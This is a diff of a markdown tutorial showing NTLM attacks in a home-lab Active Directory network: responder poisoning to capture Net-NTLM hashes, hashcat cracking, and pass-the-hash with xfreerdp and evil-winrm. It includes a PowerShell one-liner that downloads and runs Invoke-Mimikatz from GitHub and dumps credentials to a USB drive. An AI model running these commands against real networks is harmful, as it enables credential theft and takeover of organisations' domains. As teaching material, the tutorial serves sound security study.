@@ -1,22 +1,23 @@
-# Pre-reading 🔍📚
+# INTRO
 NTLM, otherwise known as the NT (New Technology) LAN Manager is a system of Microsoft security protocols used to provide various services within a Windows network. It is used to facilitate the following aspects:
-- Authentication
-- Integrity and
-- Confidentiality
+- Authentication;
+- Integrity and;
+- Confidentiality.
 
-NTLM is preceded by the Microsoft LAN Manager (LANMAN) and is succeeded by the new cross-platform protocol, Kerberos. Despite being considered insecure by today's standards, NTLM is still widely used within corporate and some home-lab Windows networks - usually as a falllback if other protocols aren't available.
+NTLM is preceded by the Microsoft LAN Manager (LANMAN) and is succeeded by the new cross-platform protocol, Kerberos. Despite being considered insecure by today's standards, NTLM is still widely used within corporate and some home-lab Windows networks - usually as a fallback if other protocols like Kerberos aren't available for a particular service.
 
-Unfortunately, this means that if an attacker gains access to the local area network which hosts a Windows network, downgrade attacks will render any new protocols useless, if NTLM is still enabled.
+Unfortunately, this means that if an attacker gains access to the local area network which hosts a Windows network, downgrade attacks can happen if NTLM is still enabled.
 
-### Rant brief 📜
-This rant will describe and showcase 2 ways, in which an attacker with either physical or remote access to the local network and/or devices can exfiltrate NTLM and Net-NTLM hashes in order to compromise a network.
+# OVERVIEW
+We'll explore 2 ways, in which an attacker with either physical or remote access to the local network and/or devices can exfiltrate NTLM and Net-NTLM hashes in order to compromise a network.
 
-## Network-based Attack 🌐📖
-This attack requires that the attacker gains access to the local area network, either by connecting their malicious device using a wireless connection such as Wi-Fi or through establishing a physical connection using something like Ethernet.
+# METHOD 1
+## Network Attack Theory
+This attack requires that the attacker gains access to the local area network, either by connecting their malicious device using a wireless connection such as Wi-Fi or through establishing a wired connection using Ethernet.
 
-> Note the attacker could also perform this attack remotely if they have root access to a device which is on the local network.
+> It's also possible an ttacker could also perform this attack remotely if they have remote root access to a device which is already on the local network.
 
-The attacker can then use a tool called `responder` which allows them to "poison" aspects of the local network. Poisoning, a term synonymoous with "spoofing", works by sending out false information onto the local network which tricks devices into trusting the attacker's machine allowing them to capture data from the network.
+A utility called `responder` can be used to poison the local network by sending out false information onto the local network via broadcast which tricks devices into trusting the attacker's machine or otherwise accepting malicious network configuration information, allowing the attacker to capture and redirect certain types of traffic within the network.
 
 In this attack, `responder` poisons the following network services which are common on Windows and other networks:
 - LLMNR (Link-Local Multicast Name Resolution) https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution
@@ -29,11 +30,9 @@ https://en.wikipedia.org/wiki/Multicast_DNS
 - DHCP (Dynamic Host Configuration Protocol)
 https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol
 
-We won't go into how these protocols work in this rant, however just be aware that these are commonly used in local networks to provide automatic discovery of services and devices on the network. Now, anything that is automatic clearly has some weaknesses and unfortunately, spoofing/poisoning is one of them. 
+I'm not going to go into full detail on all of these protocols however just be aware that these are commonly used in local networks to provide automatic discovery of services and devices on the network. Now, anything that is automatic evidently must have some weaknesses and that is indeed what spoofing/poisoning is an example of.
 
-There are mitigations of course and many networks employ detection systems to try catch and block attempts to poison the networt but they aren't 100% perfect.
-
-Back to our attack, once `responder` has poisoned the network, it will spawn a number of fake servers which will answer to a client's request for a service, and in turn capture their Net-NTLM hash which can then be cracked. `responder` is configured by default to spawn all of the following servers: `HTTP`, `HTTPS`, `WPAD Proxy`, `Auth proxy`, `SMB`, `Kerberos`, `SQL`, `FTP`, `IMAP`, `POP3`, `SMTP`, `DNS`, `LDAP`, `RDP`, `DCE-RPC`, `WinRM`.
+Once `responder` has poisoned the network, it will spawn a number of fake servers which will answer to a client's request for a service, and in turn capture their Net-NTLM hash which can then be cracked. `responder` is configured by default to spawn all of the following servers: `HTTP`, `HTTPS`, `WPAD Proxy`, `Auth proxy`, `SMB`, `Kerberos`, `SQL`, `FTP`, `IMAP`, `POP3`, `SMTP`, `DNS`, `LDAP`, `RDP`, `DCE-RPC`, `WinRM`.
 
 On a Windows network, the most common type of server you would find is SMB, which stands for Server Message Block, that is used to provide shared access to files on a dedicated fileserver as well as shared access to organisation resources such as printers, scanners, media and other IoT devices.
 
@@ -51,14 +50,13 @@ So, in a nutshell - here's what happens:
 - Client responds with the answer containing their Net-NTLM hash in order to authenticate (Game over at this point)
 - Attacker can either ignore the client or send back an error.
 
-So without further ado, let's try this out! 
+## Network Attack Demo
 
-### Network-based attack DEMO 🌐▶️
 > :warning: You should only perform this attack on a network you own or have permission to attack from the owner. In my example, I created the Windows AD DS network on my own computer in a virtual environment and gave myself permission to attack it.
 
-The network which we are going to attack runs a service called Active Directory (https://en.wikipedia.org/wiki/Active_Directory) which is commonly used in organisations to manage a lot of computers at the same time.
+The network which we are going to attack us an Active Directory network (https://en.wikipedia.org/wiki/Active_Directory) which is commonly used in organisations to manage a lot of computers at the same time.
 
-This rant will not cover how to set up Active Directory however below I have provided 2 screenshots of both the domain controller and the client PC we will be targeting.
+I won't cover how to set up Active Directory however below I have provided 2 screenshots of both the domain controller and the client PC we will be targeting.
 
 ![Server 2022 (logged on as `ECORP\Administrator`).](https://github.com/adev4004/rants/blob/main/assets/0/0.png?raw=true)
 Server 2022 (logged on as `ECORP\Administrator`).
@@ -66,7 +64,7 @@ Server 2022 (logged on as `ECORP\Administrator`).
 ![Windows 10 PC (logged on as `ECORP\Volk`, a standard user).](https://github.com/adev4004/rants/blob/main/assets/0/1.png?raw=true)
 Windows 10 PC (logged on as `ECORP\Volk`, a standard user).
 
-Firstly, we will assume that the attacker has gained physical access to the local area network by climbing through an open window of an office on the ground level. They have traversed the floor and have entered a vacant room where they discovered an Ethernet port. Equipped with a laptop and an Ethernet cable, they boot up their machine and connect it to the network. The wired network does not require authentication as it was assumed that the building is secure.
+In our made-up scenario, we will assume that the attacker has gained physical access to the local area network by breaching physical security. They have gained access to the local network by connecting an ethernet cable to a socket in the wall. The organisation did not employ 802.1x security so the attacker is able to communicate on the local network right away.
 
 ![The attacker's laptop, displaying the `neofetch` system info command.](https://github.com/adev4004/rants/blob/main/assets/0/2.png?raw=true)
 The attacker's laptop, displaying the `neofetch` system info command.
@@ -88,8 +86,13 @@ The attacker successfully ran `sudo responder -I eth0 -wPdv`.
 
 At this stage, all the attacker has to do is wait. No more action is required to obtain the Net-NTLM hash. Unaware of this attack, the office worker logged into `ECORP\Volk` has tried to access `\\fileserver1` after receiving an email from what appears to be a colleague from another department. The email said that this file server was new and that IT have not yet implemented a new GPO in order to automount it to an easily accessible drive letter within file explorer.
 
+This is an example of a hybrid cyber attack, making use of both the technical weaknesses of the network as well as social engineering. The colleague sees no reason to find the email suspicious as there were no links or instructions to access external resources - just instructions on how to open the file share on the organisation's Intranet which is considered to be secure.
+
 ![The user sees a login prompt to access the file server which doesn't actually exist.](https://github.com/adev4004/rants/blob/main/assets/0/5.png?raw=true)
 The user sees a login prompt to access the file server which doesn't actually exist.
+
+### What Happened?
+The user has typed in `\\fileserver1` into file explorer. This caused their computer to send out broadcast discovery packets onto the local network to find `\\fileserver1`. Now, this server doesn't actually exist; however, because the attacker was connected to the local network and was running `responder`, their computer detected this broadcast and replied to it, asking for authentication information, pretending to be `\\fileserver1`.
 
 ![The attacker's laptop now has the Net-NTLM hash of this user shown below:](https://github.com/adev4004/rants/blob/main/assets/0/6.png?raw=true)
 The attacker's laptop now has the Net-NTLM hash of this user shown below:
@@ -103,26 +106,26 @@ Now unlike the regular NTLM hashes, which we will demonstrate further on, these 
 ```bash
 hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 ```
-Where `hash.txt` contains the Net-NTLM hash string and `cracked.txt` will contain the plaintext password, if found. There are other ways to crack passwords, using different methods, but this rant won't go that far.
+Where `hash.txt` contains the Net-NTLM hash string and `cracked.txt` will contain the plaintext password, if found. There are other ways to crack passwords, using different utilities, but that's beyond our scope.
 
 > Note by default the rockyou.txt list in gzipped inside an archive and you will need to unzip it with `gzip -d /usr/share/wordlists/rockyou.txt.gz`.
 
-So that's Net-NTLM hacking for ya! The next part will be local NTLM hacking, and a technique, called "pass the hash", that bypasses password cracking entirely!
-
-## Local NTLM hash dumping + "pass the hash" 🗝️📖
-Arguably, the network-based attacks are more exciting because you can do it without being near the victim at all if you can find a way to remotely access the LAN. However, if you can gain physical access to a machine logged on to a privileged account, you can dump the credentials of all users logged onto that machine within seconds.
-
-One can achieve this by dumping the NTLM hashes using Mimikatz - a popular utility for exploiting Windows. You can use a bad USB in order to do this. Please be aware that Mimikatz is a known tool and is detected by most anti-virus companies, for our demo we had to disable Windows Defender.
+# METHOD 2
+## Local NTLM Hash Theory
+If one can gain physical access to a machine logged on to a privileged account, they can dump the credentials of all users logged onto that machine within seconds. You can achieve this by dumping the NTLM hashes using Mimikatz - a popular utility for exploiting Windows. You can use a bad USB or rubber ducky in order to do this quickly. Please be aware that Mimikatz is a known tool and is detected by most anti-virus companies, for our demo we had to disable Windows Defender.
 
 Here's an example script that could be typed into a run-box and then executed as administrator with the key-combination of `CTRL` + `SHIFT` + `ENTER`:
-```pwsh
+```
 powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds | Out-File "E:\hashes-dump.txt"
 ```
-:rotating_light: Do not run this script on your machine! It is bad practice to run random PowerShell scripts which you do did not create yourself or audit. :rotating_light: 
 
-Once the hashes have been dumped, they can be later used in a "pass the hash" attack to bypass password authentication.
 
-### Local NTLM dumping DEMO 🗝️▶️
+## "Pass The Hash" Theory
+This method works because of an inherent weakness of LANMAN and NTLM's handling of user sessions. When a user logs into the local PC, NTLM handles this authentication and stores the user's password as a hash in system memory, where it was originally deemed to be secure. Unfortunately, this isn't the case and a tool like Mimikatz can rip it right out of memory, allowing the hash to be used in order to impersonate that user account in almost any security context.
+
+This hash is also the same accross multiple login sessions, until the password is changed so it allows attackers to have persistent access to the compromised user account. The hash is mainly used in place of the password when the system needs to authenticate to other Windows services, etc. However, for obvious reasons, this hash is never transmitted over the network (Windows uses Net-NTLM for that) and is only used locally.
+
+## Local NTLM Hash Demo
 So in this example, an IT admin has logged onto a local user account on a PC which isn't working correctly. Unfortunately, they have forgotten to log out or lock the PC before walking away from it for whatever reason.
 
 The attacker takes advantage of this opportunity and inserts their bad USB into the PC. The script executes.
@@ -132,6 +135,7 @@ Dumped text file containing the Mimikatz output which has the hashes for each lo
 
 The attacker can now walk away and examine the hashes on their own laptop and begin to craft their next attack.
 
+## "Pass The Hash" Demo
 They have identified that the Domain Admin `dcadmin` was also logged onto this PC at some point. This is useful because they can now access any domain PC, and possibly the domain controller itself. They have obtained their hash which is `122d9d86ba71db735933590c35c59620` and will attempt to login as them to the same PC.
 
 They then run this command to connect via RDP:
@@ -149,18 +153,17 @@ However, the attacker thinks that the Domain Controller server may have Windows 
 evil-winrm -i 172.0.16.1 -u dcadmin -H 122d9d86ba71db735933590c35c59620
 ```
 
-They know the IP address of the DC because it happens to also be the gateway of this network (this is very bad never do this in real life lol).
+They know the IP address of the DC because it happens to also be the gateway of this poorly configured network.
 
 ![They attacker has a shell using the WinRM service using "pass the hash" technique.](https://github.com/adev4004/rants/blob/main/assets/0/9.png?raw=true)
 They attacker has a shell using the WinRM service using "pass the hash" technique.
 
-At this stage they can infect the DC with malware because as far as security is concerned, this is game over for the office. They can even change the group policy settings to allow the RDP sessions to use pass the hash although this wouldn't be needed.
+At this stage they can infect the DC with malware because as far as security is concerned, this is game over for the network. The attacker can even change the group policy settings to allow the RDP sessions to use pass the hash.
 
-And that's local NTLM for ya! 
+# OUTRO
+Well done for getting this far. You've now learnt a bit about legacy Windows security protocols and how they can be exploited to gain access to an AD DS network. If you're interested in this kind of stuff, I'd encourage reading about Kerberos golden tickets as that's another powerful method of gaining full access to a domain's resources.
 
-Now it's important to remember that there are so many ways to breach an organisation's network. These 2 methods aren't the only ones and they're not actually that different from each other. In a real world scenario you'd probably see a combination of the two being used (if the network is vulnerable to this).
-
-## Further reading: 📚
+# Further reading
 - https://www.thehacker.recipes/ad/movement/ntlm
 - https://book.hacktricks.xyz/windows-hardening/ntlm
 - https://medium.com/cyber-security-resources/hacking-and-cracking-ntlm-hash-to-get-windows-admin-password-f44819b01db5
